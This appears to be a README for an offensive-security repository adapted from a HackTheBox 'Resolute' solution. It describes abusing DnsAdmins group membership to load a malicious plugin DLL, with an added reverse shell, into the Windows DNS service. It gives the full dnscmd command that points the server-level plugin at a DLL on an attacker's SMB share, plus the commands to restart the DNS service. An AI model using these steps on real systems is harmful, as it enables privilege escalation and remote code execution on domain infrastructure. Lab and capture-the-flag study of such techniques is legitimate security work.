# dns-exe-persistance
sample plugin dll for windows DNS server: ServerLevelPluginDll, inject a malicious DLL plugin into the DNS service (compromised user is a member of DNSAdmin group on the target machine)

Modified and added a reverse shell \
From IppSec's solution for Resolute@HTB



Compile DLL, transfer it to a remote SMB Share \
On victim machine (with user belongs to group DnsAdmins): ```dnscmd 127.0.0.1 /config /serverlevelplugindll \\10.x.x.x\$SHARENAME\$DLLNAME.dll``` \
Restart DNS Server on the victim machine: ```sc.exe stop dns && sc.exe start dns```


